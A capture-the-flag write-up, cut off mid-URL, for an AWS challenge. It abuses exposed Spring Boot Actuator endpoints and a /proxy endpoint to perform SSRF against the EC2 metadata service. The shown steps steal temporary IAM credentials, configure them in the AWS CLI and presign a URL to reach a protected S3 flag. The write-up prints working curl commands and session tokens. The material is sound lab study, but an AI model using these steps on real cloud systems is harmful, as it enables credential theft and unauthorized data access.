#  Perimeter Leak 

---

 After weeks of exploits and privilege escalation you've gained access to what 
you hope is the final server that you can then use to extract out the secret flag 
from an S3 bucket.

It won't be easy though. The target uses an AWS data perimeter to restrict access 
to the bucket contents.

Good luck! 

---


Spring Boot Actuator takes me to the official [documentation](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).

```bash
user@monthly-challenge:~$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/health
{"status":"UP"}
```

---

#### Finding Endpoints.

```bash
user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq '.contexts.spring.mappings.dispatcherServlets.dispatcherServlet[]?.details?.requestMappingConditions?.patterns[]?'
"/actuator/info"
"/actuator/threaddump"
"/actuator/caches/{cache}"
"/actuator/loggers/{name}"
"/actuator/sbom"
"/actuator/env"
"/actuator/mappings"
"/actuator/conditions"
"/actuator/health"
"/actuator/caches"
"/actuator/metrics/{requiredMetricName}"
"/actuator/scheduledtasks"
"/actuator/configprops"
"/actuator/caches"
"/actuator/env/{toMatch}"
"/actuator"
"/actuator/sbom/{id}"
"/actuator/beans"
"/actuator/loggers/{name}"
"/actuator/threaddump"
"/actuator/configprops/{prefix}"
"/actuator/caches/{cache}"
"/actuator/loggers"
"/actuator/metrics"
"/actuator/health/**"
"/proxy"
"/"
"/error"
"/error"
```
---


#### env endpoint

```bash
user@monthly-challenge:~$ curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env
{"activeProfiles":[],"defaultProfiles":["default"],"propertySources":[{"name":"server.ports","properties":{"local.server.port":{"value":8080}}},{"name":"servletContextInitParams","properties":{}},{"name":"systemProperties","properties":{"java.specification.version":{"value":"24"},"sun.jnu.encoding":{"value":"UTF-8"},"java.class.path":{"value":"/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"},"java.vm.vendor":{"value":"Amazon.com Inc."},"sun.arch.data.model":{"value":"64"},"java.vendor.url":{"value":"https://aws.amazon.com/corretto/"},"catalina.useNaming":{"value":"false"},"user.timezone":{"value":"UTC"},"java.vm.specification.version":{"value":"24"},"os.name":{"value":"Linux"},"APPLICATION_NAME":{"value":"spring"},"sun.java.launcher":{"value":"SUN_STANDARD"},"sun.boot.library.path":{"value":"/usr/lib/jvm/java-24-amazon-corretto.x86_64/lib"},"sun.java.command":{"value":"/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"},"jdk.debug":{"value":"release"},"sun.cpu.endian":{"value":"little"},"user.home":{"value":"/home/ec2-user"},"user.language":{"value":"en"},"java.specification.vendor":{"value":"Oracle Corporation"},"java.version.date":{"value":"2025-04-15"},"java.home":{"value":"/usr/lib/jvm/java-24-amazon-corretto.x86_64"},"file.separator":{"value":"/"},"java.vm.compressedOopsMode":{"value":"32-bit"},"line.separator":{"value":"\n"},"java.vm.specification.vendor":{"value":"Oracle Corporation"},"java.specification.name":{"value":"Java Platform API Specification"},"FILE_LOG_CHARSET":{"value":"UTF-8"},"java.awt.headless":{"value":"true"},"java.protocol.handler.pkgs":{"value":"org.springframework.boot.loader.net.protocol"},"sun.management.compiler":{"value":"HotSpot 64-Bit Tiered Compilers"},"java.runtime.version":{"value":"24.0.1+9-FR"},"user.name":{"value":"ec2-user"},"stdout.encoding":{"value":"UTF-8"},"path.separator":{"value":":"},"os.version":{"value":"6.1.134-152.225.amzn2023.x86_64"},"java.runtime.name":{"value":"OpenJDK Runtime Environment"},"file.encoding":{"value":"UTF-8"},"java.vm.name":{"value":"OpenJDK 64-Bit Server VM"},"java.vendor.version":{"value":"Corretto-24.0.1.9.1"},"java.vendor.url.bug":{"value":"https://github.com/corretto/corretto-24/issues/"},"java.io.tmpdir":{"value":"/tmp"},"catalina.home":{"value":"/tmp/tomcat.8080.7538161798062223442"},"java.version":{"value":"24.0.1"},"user.dir":{"value":"/home/ec2-user/spring-boot"},"os.arch":{"value":"amd64"},"java.vm.specification.name":{"value":"Java Virtual Machine Specification"},"PID":{"value":"515405"},"CONSOLE_LOG_CHARSET":{"value":"UTF-8"},"catalina.base":{"value":"/tmp/tomcat.8080.7538161798062223442"},"native.encoding":{"value":"UTF-8"},"java.library.path":{"value":"/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib"},"java.vm.info":{"value":"mixed mode, sharing"},"stderr.encoding":{"value":"UTF-8"},"java.vendor":{"value":"Amazon.com Inc."},"java.vm.version":{"value":"24.0.1+9-FR"},"sun.io.unicode.encoding":{"value":"UnicodeLittle"},"java.class.version":{"value":"68.0"},"LOGGED_APPLICATION_NAME":{"value":"[spring] "}}},{"name":"systemEnvironment","properties":{"INVOCATION_ID":{"value":"cb49fb685ed2497eb60672956106753c","origin":"System Environment Property \"INVOCATION_ID\""},"HOME":{"value":"/home/ec2-user","origin":"System Environment Property \"HOME\""},"PATH":{"value":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin","origin":"System Environment Property \"PATH\""},"SHELL":{"value":"/bin/bash","origin":"System Environment Property \"SHELL\""},"BUCKET":{"value":"challenge01-470f711","origin":"System Environment Property \"BUCKET\""},"LOGNAME":{"value":"ec2-user","origin":"System Environment Property \"LOGNAME\""},"USER":{"value":"ec2-user","origin":"System Environment Property \"USER\""},"SYSTEMD_EXEC_PID":{"value":"515405","origin":"System Environment Property \"SYSTEMD_EXEC_PID\""},"LANG":{"value":"C.UTF-8","origin":"System Environment Property \"LANG\""},"JOURNAL_STREAM":{"value":"8:1745835","origin":"System Environment Property \"JOURNAL_STREAM\""}}},{"name":"Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'","properties":{"spring.application.name":{"value":"spring","origin":"class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25"},"management.endpoints.web.exposure.include":{"value":"*","origin":"class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43"},"management.endpoints.web.expose":{"value":"*","origin":"class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33"},"management.endpoint.env.show-values":{"value":"always","origin":"class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37"},"server.error.include-message":{"value":"always","origin":"class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30"}}},{"name":"applicationInfo","properties":{"spring.application.version":{"value":"0.0.1-SNAPSHOT"},"spring.application.pid":{"value":515405}}}]}

```

---

```json
{
  "activeProfiles": [],
  "defaultProfiles": [
    "default"
  ],
  "propertySources": [
    {
      "name": "server.ports",
      "properties": {
        "local.server.port": {
          "value": 8080
        }
      }
    },
    {
      "name": "servletContextInitParams",
      "properties": {}
    },
    {
      "name": "systemProperties",
      "properties": {
        "java.specification.version": {
          "value": "24"
        },
        "sun.jnu.encoding": {
          "value": "UTF-8"
        },
        "java.class.path": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "java.vm.vendor": {
          "value": "Amazon.com Inc."
        },
        "sun.arch.data.model": {
          "value": "64"
        },
        "java.vendor.url": {
          "value": "https://aws.amazon.com/corretto/"
        },
        "catalina.useNaming": {
          "value": "false"
        },
        "user.timezone": {
          "value": "UTC"
        },
        "java.vm.specification.version": {
          "value": "24"
        },
        "os.name": {
          "value": "Linux"
        },
        "APPLICATION_NAME": {
          "value": "spring"
        },
        "sun.java.launcher": {
          "value": "SUN_STANDARD"
        },
        "sun.boot.library.path": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64/lib"
        },
        "sun.java.command": {
          "value": "/home/ec2-user/spring-boot/target/spring-boot-0.0.1-SNAPSHOT.jar"
        },
        "jdk.debug": {
          "value": "release"
        },
        "sun.cpu.endian": {
          "value": "little"
        },
        "user.home": {
          "value": "/home/ec2-user"
        },
        "user.language": {
          "value": "en"
        },
        "java.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.version.date": {
          "value": "2025-04-15"
        },
        "java.home": {
          "value": "/usr/lib/jvm/java-24-amazon-corretto.x86_64"
        },
        "file.separator": {
          "value": "/"
        },
        "java.vm.compressedOopsMode": {
          "value": "32-bit"
        },
        "line.separator": {
          "value": "\n"
        },
        "java.vm.specification.vendor": {
          "value": "Oracle Corporation"
        },
        "java.specification.name": {
          "value": "Java Platform API Specification"
        },
        "FILE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "java.awt.headless": {
          "value": "true"
        },
        "java.protocol.handler.pkgs": {
          "value": "org.springframework.boot.loader.net.protocol"
        },
        "sun.management.compiler": {
          "value": "HotSpot 64-Bit Tiered Compilers"
        },
        "java.runtime.version": {
          "value": "24.0.1+9-FR"
        },
        "user.name": {
          "value": "ec2-user"
        },
        "stdout.encoding": {
          "value": "UTF-8"
        },
        "path.separator": {
          "value": ":"
        },
        "os.version": {
          "value": "6.1.134-152.225.amzn2023.x86_64"
        },
        "java.runtime.name": {
          "value": "OpenJDK Runtime Environment"
        },
        "file.encoding": {
          "value": "UTF-8"
        },
        "java.vm.name": {
          "value": "OpenJDK 64-Bit Server VM"
        },
        "java.vendor.version": {
          "value": "Corretto-24.0.1.9.1"
        },
        "java.vendor.url.bug": {
          "value": "https://github.com/corretto/corretto-24/issues/"
        },
        "java.io.tmpdir": {
          "value": "/tmp"
        },
        "catalina.home": {
          "value": "/tmp/tomcat.8080.7538161798062223442"
        },
        "java.version": {
          "value": "24.0.1"
        },
        "user.dir": {
          "value": "/home/ec2-user/spring-boot"
        },
        "os.arch": {
          "value": "amd64"
        },
        "java.vm.specification.name": {
          "value": "Java Virtual Machine Specification"
        },
        "PID": {
          "value": "515405"
        },
        "CONSOLE_LOG_CHARSET": {
          "value": "UTF-8"
        },
        "catalina.base": {
          "value": "/tmp/tomcat.8080.7538161798062223442"
        },
        "native.encoding": {
          "value": "UTF-8"
        },
        "java.library.path": {
          "value": "/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib"
        },
        "java.vm.info": {
          "value": "mixed mode, sharing"
        },
        "stderr.encoding": {
          "value": "UTF-8"
        },
        "java.vendor": {
          "value": "Amazon.com Inc."
        },
        "java.vm.version": {
          "value": "24.0.1+9-FR"
        },
        "sun.io.unicode.encoding": {
          "value": "UnicodeLittle"
        },
        "java.class.version": {
          "value": "68.0"
        },
        "LOGGED_APPLICATION_NAME": {
          "value": "[spring] "
        }
      }
    },
    {
      "name": "systemEnvironment",
      "properties": {
        "INVOCATION_ID": {
          "value": "cb49fb685ed2497eb60672956106753c",
          "origin": "System Environment Property \"INVOCATION_ID\""
        },
        "HOME": {
          "value": "/home/ec2-user",
          "origin": "System Environment Property \"HOME\""
        },
        "PATH": {
          "value": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin",
          "origin": "System Environment Property \"PATH\""
        },
        "SHELL": {
          "value": "/bin/bash",
          "origin": "System Environment Property \"SHELL\""
        },
        "BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property \"BUCKET\""
        },
        "LOGNAME": {
          "value": "ec2-user",
          "origin": "System Environment Property \"LOGNAME\""
        },
        "USER": {
          "value": "ec2-user",
          "origin": "System Environment Property \"USER\""
        },
        "SYSTEMD_EXEC_PID": {
          "value": "515405",
          "origin": "System Environment Property \"SYSTEMD_EXEC_PID\""
        },
        "LANG": {
          "value": "C.UTF-8",
          "origin": "System Environment Property \"LANG\""
        },
        "JOURNAL_STREAM": {
          "value": "8:1745835",
          "origin": "System Environment Property \"JOURNAL_STREAM\""
        }
      }
    },
    {
      "name": "Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'",
      "properties": {
        "spring.application.name": {
          "value": "spring",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 1:25"
        },
        "management.endpoints.web.exposure.include": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 2:43"
        },
        "management.endpoints.web.expose": {
          "value": "*",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 3:33"
        },
        "management.endpoint.env.show-values": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 4:37"
        },
        "server.error.include-message": {
          "value": "always",
          "origin": "class path resource [application.properties] from spring-boot-0.0.1-SNAPSHOT.jar - 5:30"
        }
      }
    },
    {
      "name": "applicationInfo",
      "properties": {
        "spring.application.version": {
          "value": "0.0.1-SNAPSHOT"
        },
        "spring.application.pid": {
          "value": 515405
        }
      }
    }
  ]
}

```

---

#### Okay, so it appears that this application is running on an EC2, and we have learned the name of an S3 bucket.

```json
},
         "BUCKET": {
          "value": "challenge01-470f711",
          "origin": "System Environment Property \"BUCKET\""
},
```

---

```bash
user@monthly-challenge:~$ curl -I https://challenge01-470f711.s3.amazonaws.com
HTTP/1.1 403 Forbidden
x-amz-bucket-region: us-east-1
x-amz-request-id: 1795YHAK78WS63BE
x-amz-id-2: EEvNklQ2PUHxWpVZ1FVSOXVolrZ7gokIlGmcOI1vy444z51zDwvDc5EPx9+fyT3/zD0zkpqVCsJcW+C9v9ZvCvIbmMDX1xsT
Content-Type: application/xml
Transfer-Encoding: chunked
Date: Wed, 27 Aug 2025 16:32:28 GMT
Server: AmazonS3

user@monthly-challenge:~$

```

---

#### proxy endpoint

```bash
user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq '.contexts.spring.mappings.dispatcherServlets.dispatcherServlet[] | select(.details?.requestMappingConditions?.patterns[]? == "/proxy")'
{
  "predicate": "{ [/proxy], params [url]}",
  "handler": "challenge.Application#proxy(String)",
  "details": {
    "handlerMethod": {
      "className": "challenge.Application",
      "name": "proxy",
      "descriptor": "(Ljava/lang/String;)Ljava/lang/String;"
    },
    "requestMappingConditions": {
      "consumes": [],
      "headers": [],
      "methods": [],
      "params": [
        {
          "name": "url",
          "negated": false
        }
      ],
      "patterns": [
        "/proxy"
      ],
      "produces": []
    }
  }
}
```

---

#### Let's check the Instance Metadata Service

```bash
user@monthly-challenge:~$ curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.
254/latest/meta-data/"
HTTP error: 401 Unauthorized
user@monthly-challenge:~$ 
```

#### So it's most likely using IMDSv2, which requires a token.  Let's try,

```bash
user@monthly-challenge:~$ TOKEN=`curl -X PUT "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0    430      0 --:--:-- --:--:-- --:--:--   430
user@monthly-challenge:~$ echo $TOKEN
AQAEAFJq6_GTNHQOswbcA-vkF43RUnow8S3fn6c5g9K_RjBzv_5eYg==
user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
user@monthly-challenge:~$

```

---


```bash
user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloudions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/info"
{
  "Code" : "Success",
  "LastUpdated" : "2025-08-27T16:47:14Z",
  "InstanceProfileArn" : "arn:aws:iam::092297851374:instance-profile/challenge01-b18ca40",
  "InstanceProfileId" : "AIPARK7LBOHXOCM5PCQY3"
}
user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-chamions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials"
challenge01-5592368user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@chalions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
{
  "Code" : "Success",
  "LastUpdated" : "2025-08-27T16:46:30Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIARK7LBOHXD3BHRRV5",
  "SecretAccessKey" : "LcBPGBIV88uEOb3L38/vAtc4n89fyZdTj0Ky0Jet",
  "Token" : "IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJIMEYCIQDNRo+ofsAxdNXFOE02NCIkI4aY11uvsnPJ96VbGV81DgIhAPxx7g7/VYWmqDkHcMiZwmu+XimI2v2J2TdynBpdw0qVKsEFCJL//////////wEQABoMMDkyMjk3ODUxMzc0IgwL1BOVcU/0bib94xcqlQV/ALeo71aCoG/siGqyoX03B7HcbWA96Fe+pLEIuB/uKe6yY5v6PxdUP2ih5lCNB74bhy5tKgfKMsuKZB/9mDLnXcUzxBBUKPWriY6Xzlr4y6173d81T7CpzEm4H6XvVjP/MCieqhKxuOlhqvFXPYBqzeUpSDKDZgnU25V9WD76upwXg4EbxObFphSus2iGrEuQbHr418X+9tAOJsVKwDinheIdFGW48d1HWl0rsnEySxxCBw9+fJ6dfO3tixTDzumRQYXDvuNLUbrLT/M9thL4dmlh6u/pHPtLmIfYk2M/3ajHGiHYWEWCPAiv1i137C9N+foMLnpDmGhn0XJq7IokC1FtGLx2SP3IceVfx97tCNrNQT4JjfV3X+us9SboHIGunoZYBqYFPajMXOt2UQ6S7iSaqixU0EGXAWCJGetywi7OXDEcqmL6bj78gTKMIiRjexowv0rQ/zeK301TcmgGjgrRRgjknpCk13wTJ2WkH22vYpjIgiFw7nIFLFBhUGMlMnKV+WgQxJOnOhQ6LS+r6/9seTMCp2T6/Glo7oEYxO29p1ROL1WSt++N5VH68kmKSTXS1w5n31kNKYL+5YevGsURSPcMGe8GPrkijqnyv3fjl8z25ynqDk2sQB6iKzZPvfh3nz6n6MyiAiiT0DZEu75t9GmFKRL2xIBqjd3RIwjb37eBA58sACC7UoAmC4tvthCHmZW+KbPCW+O1IXt7gtOK0PEiZ4Kv9hiIteNYzLpf0aaPgMaz/4nXcWhp/FDXmz0dhFkKlWzXerERU7viida9E6VwLAQ+if5JwLuckxOTjEut5xpY0aZkUEoxbHXtOnSrSrPra+O6gXz2LHj8vAzyXxRFnDHH0rPfY6DNp8ZvAMjVMJLtvMUGOrABji5lGMF5yOQIR84Sg02RyI80GTwqiHS4hR6WsitTxbrLtQ68pbl2dvLGACWtlWRM5QOp2J0qrqBhVZEcu69OcDe/+lG8eUyDgoOwfam+HzBHEE485P0d/l9cpv5D4yXoMXZ31RYuUmXmVrMBu8Vp8HIekjZ2vlSKumjlrU1HDC+MOVBMMw3Fe6rEFjMGyx+GKK2QQNjwdFX25V0trcwSvtNnlNjUeDuiNKiW5jhNiuY=",
  "Expiration" : "2025-08-27T23:06:04Z"
}
user@monthly-challenge:~$

```

---


#### aws configure

```bash
user@monthly-challenge:~$ aws configure
AWS Access Key ID [None]: ASIARK7LBOHXD3BHRRV5
AWS Secret Access Key [None]: LcBPGBIV88uEOb3L38/vAtc4n89fyZdTj0Ky0Jet
Default region name [None]: us-east-1
Default output format [None]: json
user@monthly-challenge:~$ aws configure set aws_session_token IQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJIMEYCIQDNRo+ofsAxdNXFOE02NCIkI4aY11uvsnPJ96VbGV81DgIhAPxx7g7/VYWmqDkHcMiZwmu+XimI2v2J2TdynBpdw0qVKsEFCJL//////////wEQABoMMDkyMjk3ODUxMzc0IgwL1BOVcU/0bib94xcqlQV/ALeo71aCoG/siGqyoX03B7HcbWA96Fe+pLEIuB/uKe6yY5v6PxdUP2ih5lCNB74bhy5tKgfKMsuKZB/9mDLnXcUzxBBUKPWriY6Xzlr4y6173d81T7CpzEm4H6XvVjP/MCieqhKxuOlhqvFXPYBqzeUpSDKDZgnU25V9WD76upwXg4EbxObFphSus2iGrEuQbHr418X+9tAOJsVKwDinheIdFGW48d1HWl0rsnEySxxCBw9+fJ6dfO3tixTDzumRQYXDvuNLUbrLT/M9thL4dmlh6u/pHPtLmIfYk2M/3ajHGiHYWEWCPAiv1i137C9N+foMLnpDmGhn0XJq7IokC1FtGLx2SP3IceVfx97tCNrNQT4JjfV3X+us9SboHIGunoZYBqYFPajMXOt2UQ6S7iSaqixU0EGXAWCJGetywi7OXDEcqmL6bj78gTKMIiRjexowv0rQ/zeK301TcmgGjgrRRgjknpCk13wTJ2WkH22vYpjIgiFw7nIFLFBhUGMlMnKV+WgQxJOnOhQ6LS+r6/9seTMCp2T6/Glo7oEYxO29p1ROL1WSt++N5VH68kmKSTXS1w5n31kNKYL+5YevGsURSPcMGe8GPrkijqnyv3fjl8z25ynqDk2sQB6iKzZPvfh3nz6n6MyiAiiT0DZEu75t9GmFKRL2xIBqjd3RIwjb37eBA58sACC7UoAmC4tvthCHmZW+KbPCW+O1IXt7gtOK0PEiZ4Kv9hiIteNYzLpf0aaPgMaz/4nXcWhp/FDXmz0dhFkKlWzXerERU7viida9E6VwLAQ+if5JwLuckxOTjEut5xpY0aZkUEoxbHXtOnSrSrPra+O6gXz2LHj8vAzyXxRFnDHH0rPfY6DNp8ZvAMjVMJLtvMUGOrABji5lGMF5yOQIR84Sg02RyI80GTwqiHS4hR6WsitTxbrLtQ68pbl2dvLGACWtlWRM5QOp2J0qrqBhVZEcu69OcDe/+lG8eUyDgoOwfam+HzBHEE485P0d/l9cpv5D4yXoMXZ31RYuUmXmVrMBu8Vp8HIekjZ2vlSKumjlrU1HDC+MOVBMMw3Fe6rEFjMGyx+GKK2QQNjwdFX25V0trcwSvtNnlNjUeDuiNKiW5jhNiuY=
user@monthly-challenge:~$ aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXDP2J2E3DV:i-0bfc4291dd0acd279",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279"
}
user@monthly-challenge:~$
```

---

#### Enumerating

```bash
user@monthly-challenge:~$ aws s3 ls s3://challenge01-470f711
                           PRE private/
2025-06-18 17:15:24         29 hello.txt
user@monthly-challenge:~$ aws s3 cp s3://challenge01-470f711/hello.txt .
download: s3://challenge01-470f711/hello.txt to ./hello.txt       
user@monthly-challenge:~$ cat hello.txt
Welcome to the proxy server.

user@monthly-challenge:~$ aws s3 cp s3://challenge01-470f711/private/flag.txt -
download failed: s3://challenge01-470f711/private/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
user@monthly-challenge:~$ aws s3api list-object-versions --bucket challenge01-470f711

An error occurred (AccessDenied) when calling the ListObjectVersions operation: User: arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279 is not authorized to perform: s3:ListBucketVersions on resource: "arn:aws:s3:::challenge01-470f711" because no identity-based policy allows the s3:ListBucketVersions action
user@monthly-challenge:~$ aws s3api get-bucket-policy --bucket challenge01-470f711
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
user@monthly-challenge:~$

```

---

#### bucket policy

```json

aws --profile c1 s3api get-bucket-policy --bucket challenge01-470f711 \
  --query "Policy" --output text | jq .
  
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::challenge01-470f711/private/*",
      "Condition": {
        "StringNotEquals": {
          "aws:SourceVpce": "vpce-0dfd8b6aa1642a057"
        }
      }
    }
  ]
}
```

---

#### generate a presigned URL. 

```bash
user@monthly-challenge:~$ aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -s -R -r @uri
https%3A%2F%2Fchallenge01-470f711.s3.us-east-1.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Credential%3DASIARK7LBOHXD3BHRRV5%252F20250827%252Fus-east-1%252Fs3%252Faws4_request%26X-Amz-Date%3D20250827T172951Z%26X-Amz-Expires%3D3600%26X-Amz-SignedHeaders%3Dhost%26X-Amz-Security-Token%3DIQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJIMEYCIQDNRo%252BofsAxdNXFOE02NCIkI4aY11uvsnPJ96VbGV81DgIhAPxx7g7%252FVYWmqDkHcMiZwmu%252BXimI2v2J2TdynBpdw0qVKsEFCJL%252F%252F%252F%252F%252F%252F%252F%252F%252F%252FwEQABoMMDkyMjk3ODUxMzc0IgwL1BOVcU%252F0bib94xcqlQV%252FALeo71aCoG%252FsiGqyoX03B7HcbWA96Fe%252BpLEIuB%252FuKe6yY5v6PxdUP2ih5lCNB74bhy5tKgfKMsuKZB%252F9mDLnXcUzxBBUKPWriY6Xzlr4y6173d81T7CpzEm4H6XvVjP%252FMCieqhKxuOlhqvFXPYBqzeUpSDKDZgnU25V9WD76upwXg4EbxObFphSus2iGrEuQbHr418X%252B9tAOJsVKwDinheIdFGW48d1HWl0rsnEySxxCBw9%252BfJ6dfO3tixTDzumRQYXDvuNLUbrLT%252FM9thL4dmlh6u%252FpHPtLmIfYk2M%252F3ajHGiHYWEWCPAiv1i137C9N%252BfoMLnpDmGhn0XJq7IokC1FtGLx2SP3IceVfx97tCNrNQT4JjfV3X%252Bus9SboHIGunoZYBqYFPajMXOt2UQ6S7iSaqixU0EGXAWCJGetywi7OXDEcqmL6bj78gTKMIiRjexowv0rQ%252FzeK301TcmgGjgrRRgjknpCk13wTJ2WkH22vYpjIgiFw7nIFLFBhUGMlMnKV%252BWgQxJOnOhQ6LS%252Br6%252F9seTMCp2T6%252FGlo7oEYxO29p1ROL1WSt%252B%252BN5VH68kmKSTXS1w5n31kNKYL%252B5YevGsURSPcMGe8GPrkijqnyv3fjl8z25ynqDk2sQB6iKzZPvfh3nz6n6MyiAiiT0DZEu75t9GmFKRL2xIBqjd3RIwjb37eBA58sACC7UoAmC4tvthCHmZW%252BKbPCW%252BO1IXt7gtOK0PEiZ4Kv9hiIteNYzLpf0aaPgMaz%252F4nXcWhp%252FFDXmz0dhFkKlWzXerERU7viida9E6VwLAQ%252Bif5JwLuckxOTjEut5xpY0aZkUEoxbHXtOnSrSrPra%252BO6gXz2LHj8vAzyXxRFnDHH0rPfY6DNp8ZvAMjVMJLtvMUGOrABji5lGMF5yOQIR84Sg02RyI80GTwqiHS4hR6WsitTxbrLtQ68pbl2dvLGACWtlWRM5QOp2J0qrqBhVZEcu69OcDe%252F%252BlG8eUyDgoOwfam%252BHzBHEE485P0d%252Fl9cpv5D4yXoMXZ31RYuUmXmVrMBu8Vp8HIekjZ2vlSKumjlrU1HDC%252BMOVBMMw3Fe6rEFjMGyx%252BGKK2QQNjwdFX25V0trcwSvtNnlNjUeDuiNKiW5jhNiuY%253D%26X-Amz-Signature%3D7fa33435cf2eddf1763923c752e96e9baf0f05349a8298807e14b6278a58ef3d%0A
user@monthly-challenge:~$ PRESIGNEDURL=`aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -s -R -r @uri`
user@monthly-challenge:~$ echo $PRESIGNEDURL
https%3A%2F%2Fchallenge01-470f711.s3.us-east-1.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Credential%3DASIARK7LBOHXD3BHRRV5%252F20250827%252Fus-east-1%252Fs3%252Faws4_request%26X-Amz-Date%3D20250827T173015Z%26X-Amz-Expires%3D3600%26X-Amz-SignedHeaders%3Dhost%26X-Amz-Security-Token%3DIQoJb3JpZ2luX2VjEDkaCXVzLWVhc3QtMSJIMEYCIQDNRo%252BofsAxdNXFOE02NCIkI4aY11uvsnPJ96VbGV81DgIhAPxx7g7%252FVYWmqDkHcMiZwmu%252BXimI2v2J2TdynBpdw0qVKsEFCJL%252F%252F%252F%252F%252F%252F%252F%252F%252F%252FwEQABoMMDkyMjk3ODUxMzc0IgwL1BOVcU%252F0bib94xcqlQV%252FALeo71aCoG%252FsiGqyoX03B7HcbWA96Fe%252BpLEIuB%252FuKe6yY5v6PxdUP2ih5lCNB74bhy5tKgfKMsuKZB%252F9mDLnXcUzxBBUKPWriY6Xzlr4y6173d81T7CpzEm4H6XvVjP%252FMCieqhKxuOlhqvFXPYBqzeUpSDKDZgnU25V9WD76upwXg4EbxObFphSus2iGrEuQbHr418X%252B9tAOJsVKwDinheIdFGW48d1HWl0rsnEySxxCBw9%252BfJ6dfO3tixTDzumRQYXDvuNLUbrLT%252FM9thL4dmlh6u%252FpHPtLmIfYk2M%252F3ajHGiHYWEWCPAiv1i137C9N%252BfoMLnpDmGhn0XJq7IokC1FtGLx2SP3IceVfx97tCNrNQT4JjfV3X%252Bus9SboHIGunoZYBqYFPajMXOt2UQ6S7iSaqixU0EGXAWCJGetywi7OXDEcqmL6bj78gTKMIiRjexowv0rQ%252FzeK301TcmgGjgrRRgjknpCk13wTJ2WkH22vYpjIgiFw7nIFLFBhUGMlMnKV%252BWgQxJOnOhQ6LS%252Br6%252F9seTMCp2T6%252FGlo7oEYxO29p1ROL1WSt%252B%252BN5VH68kmKSTXS1w5n31kNKYL%252B5YevGsURSPcMGe8GPrkijqnyv3fjl8z25ynqDk2sQB6iKzZPvfh3nz6n6MyiAiiT0DZEu75t9GmFKR